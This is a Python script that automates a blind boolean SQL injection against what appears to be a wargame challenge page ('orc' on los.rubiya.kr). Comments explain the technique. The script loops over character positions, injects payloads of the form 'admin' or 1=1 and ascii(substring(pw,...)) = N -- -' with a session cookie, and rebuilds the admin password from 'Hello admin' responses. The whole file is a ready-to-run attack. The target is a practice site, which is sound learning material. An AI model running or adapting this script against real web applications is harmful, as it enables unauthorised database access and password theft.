#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
parameter = 'pw'
cookie = dict(PHPSESSID='o5dsf99oqjs2qm66agvfv20j3q')

# One pw is read, pw will be compared to the pw in the database.
# thoese two have to match.
# SUBSTRING(文字列値,取り出し開始位置,取り出し文字数)
# admin' or 1=1 and ascii(substring(pw,1,1)) > 97 -- -
# The first checks the first letter of pw is greater than 97 in ascci value 'a'
# admin' or 1=1 and ascii(substring(pw,1,1)) > 98 -- -
# The second does not return, meaning that it is less than 98 which is 97

# sqli = "admin' or 1=1 and ascii(substring(pw,1,1)) > 97 -- -"

common = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
estimated_password_length = 32 # or less 
passwd = ''



for i in range(1, estimated_password_length):
    for j in common:
        sqli = ("admin' or 1=1 and ascii(substring(pw,%d,%d)) = %d -- -" % (i,i,ord(j)))
        query_url = "%s?%s=%s" % (url,parameter,sqli)
        print("[*]%s" % query_url)

        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if "Hello admin" in res.text:
            passwd += j 
            print('password: %s' % passwd)
            break
            
        elif j in common[-1]:
            # the end of string that means the password is found
            print('password: %s' % passwd)
            exit(1)

